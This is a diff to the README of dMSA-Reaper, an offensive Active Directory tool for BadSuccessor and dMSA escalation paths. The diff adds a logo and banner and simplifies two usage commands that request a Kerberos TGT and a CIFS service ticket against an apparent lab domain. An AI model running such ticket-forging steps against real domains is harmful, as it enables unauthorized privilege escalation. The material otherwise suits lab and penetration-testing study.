@@ -1,3 +1,16 @@
+<p align="center">
+  <img src="utils/logo.png" alt="dMSA-Reaper" width="360">
+</p>
+
+```
+       ____  ________ ___       ____
+  ____/ /  |/  / ___//   |     / __ \___  ____ _____  ___  _____
+ / __  / /|_/ /\__ \/ /| |    / /_/ / _ \/ __ `/ __ \/ _ \/ ___/
+/ /_/ / /  / /___/ / ___ |   / _, _/  __/ /_/ / /_/ /  __/ /
+\__,_/_/  /_//____/_/  |_|  /_/ |_|\___/\__,_/ .___/\___/_/
+                                            /_/
+```
+
 # dMSA-Reaper
 
 dMSA-Reaper maps and exploits BadSuccessor and dMSA Ouroboros paths in
@@ -86,8 +99,7 @@ request for time skew.
 Get its TGT:
 
 ```bash
-faketime "$(rdate -n "$DC_IP" -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" \
-  dmsa-reaper tgt --op OP-20260805-1363231c \
+dmsa-reaper tgt --op OP-20260805-1363231c \
   --ccache "$PWD/user-ticket.ccache" --identity "$USER"
 ```
 
@@ -96,8 +108,7 @@ faketime "$(rdate -n "$DC_IP" -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-
 Get a service ticket for an SPN:
 
 ```bash
-faketime "$(rdate -n "$DC_IP" -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" \
-  dmsa-reaper ticket --op OP-20260805-1363231c \
+dmsa-reaper ticket --op OP-20260805-1363231c \
   --ccache "$PWD/user-ticket.ccache" --identity "$USER" \
   --spn 'cifs/DC01.checkpoint.htb'
 ```
